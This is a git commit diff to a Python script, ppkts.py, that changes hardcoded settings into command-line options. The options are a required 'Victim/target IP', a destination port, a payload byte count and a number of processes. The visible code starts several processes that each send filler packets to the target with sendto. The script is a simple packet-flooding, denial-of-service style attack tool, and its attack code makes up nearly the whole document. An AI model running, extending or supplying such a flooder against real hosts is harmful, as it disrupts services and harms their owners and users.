71a4cfc13e4ba76331de5581a42cec4c81201e1b
Haz Matts <hazmat@drinkitover.net>
2014-03-13 09:47:07 -0700

    Added argparse support, removed hardcoding.

--- ppkts.py
+++ ppkts.py
@@ -1,10 +1,22 @@
+#!/usr/bin/env python
 import sys
 import socket
+import argparse as ap
 import multiprocessing as MP
 
-target = '192.168.1.1'
-port = 22
-payload = 'x' * 1440
+p = ap.ArgumentParser(description="Make some packets.")
+# p.add_argument('-s', '--source', help='Source IP address')
+p.add_argument('-t', '--dst', help='Victim/target IP', required=True)
+p.add_argument('-p', '--port', help='Destination TCP port', required=True, type=int)
+p.add_argument('-b', '--bytes', help='Number of bytes in packet payload', type=int, default=500)
+# p.add_argument('-n', '--num', help='Number of packets to send', type=int, default=10)
+# p.add_argument('-f', '--flags', help='TCP flags (FAPS)', default='S')
+p.add_argument('--cpu', help="Number of processes to use", type=int, default=1)
+args = p.parse_args()
+
+target = args.dst
+port = args.port
+payload = 'x' * args.bytes
 procs = []
 
 def sp():
@@ -16,7 +28,7 @@ def sp():
             sock.sendto(bytes(payload, "utf-8"), (target, port))
 
 if __name__ == "__main__":
-    for a in range(24):
+    for a in range(args.cpu):
         p = MP.Process(target=sp)
         p.start()
         procs.append(p)
